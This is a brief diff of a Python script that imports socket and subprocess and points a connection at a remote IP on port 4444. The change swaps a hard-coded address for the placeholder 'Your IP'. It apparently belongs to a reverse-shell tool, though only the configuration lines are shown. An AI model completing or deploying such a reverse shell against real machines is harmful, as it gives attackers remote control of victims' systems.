@@ -2,7 +2,7 @@ import socket
 import subprocess
 
 # Set the IP and port of the remote machine
-REMOTE_IP = '192.168.8.100'
+REMOTE_IP = 'Your IP'
 REMOTE_PORT = 4444
 
 # Create a socket and connect to the remote machine
